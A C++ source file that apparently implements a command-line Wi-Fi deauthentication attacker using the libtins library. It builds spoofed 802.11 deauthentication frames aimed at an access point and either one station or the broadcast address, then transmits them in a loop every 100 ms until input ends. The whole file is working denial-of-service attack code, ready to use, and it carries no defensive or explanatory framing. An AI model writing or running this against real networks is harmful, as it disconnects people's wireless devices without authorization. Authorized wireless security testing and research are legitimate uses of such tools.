#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>

#include <tins/tins.h>

int main(int argc, char *argv[]) {
    constexpr int kMacStringSize = 17;
    Tins::Dot11::address_type station;
    
    if (argc == 3 && strlen(argv[2]) == kMacStringSize) {
        station = Tins::Dot11::BROADCAST;
    }
    else if (argc == 4 && strlen(argv[2]) == kMacStringSize
                       && strlen(argv[3]) == kMacStringSize) {
        station = Tins::Dot11::address_type{ argv[3] };
    }
    else {
        std::cerr << "usage: send_deauth <interce name> <ap mac> [<station mac>]" << std::endl;
        return 1;
    }
    
    Tins::NetworkInterface interface{ argv[1] };
    Tins::Dot11::address_type ap{ argv[2] };
    
    Tins::Dot11Deauthentication deauth{ station, ap };
    deauth.addr3(deauth.addr2());
    auto tap = Tins::RadioTap{} / deauth;
    
    Tins::PacketSender sender{ interface };
    std::atomic<bool> stop{ false };
    std::thread send{ [&]() {
        while (!stop) {
            using namespace std::literals::chrono_literals;
            sender.send(tap);
            std::this_thread::sleep_for(100ms);
        }
    }};
    
    std::string input;
    while (std::getline(std::cin, input));
    
    stop = true;
    send.join();
    
    return 0;
}
